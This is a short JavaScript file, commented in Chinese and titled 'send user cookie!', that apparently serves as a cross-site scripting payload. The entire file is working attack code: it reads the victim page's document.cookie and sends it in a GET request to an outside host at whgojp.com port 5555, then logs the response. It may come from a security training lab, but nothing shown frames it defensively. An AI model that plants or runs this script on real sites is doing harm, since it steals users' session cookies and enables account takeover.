/**
 * @description send user cookie!
 * @author:  whgojp
 * @email:  whgojp@foxmail.com
 * @Date: 2024/6/5 23:22
 */
// 创建一个新的 XMLHttpRequest 对象
var xhr = new XMLHttpRequest();

// 配置一个针对特定 URL 的 GET 请求
xhr.open('GET', 'http://whgojp.com:5555/receive?cookie='+document.cookie, true);

// 定义请求完成后的处理函数
xhr.onload = function() {
    if (xhr.status >= 200 && xhr.status < 300) {
        // 当请求成功完成时，处理返回的数据
        var responseData = JSON.parse(xhr.responseText);
        console.log(responseData);
    } else {
        // 当请求失败时，输出错误信息
        console.error('Request failed with status:', xhr.status);
    }
};

// 定义处理网络错误的函数
xhr.onerror = function() {
    console.error('Network request failed');
};

// 发送请求
xhr.send();
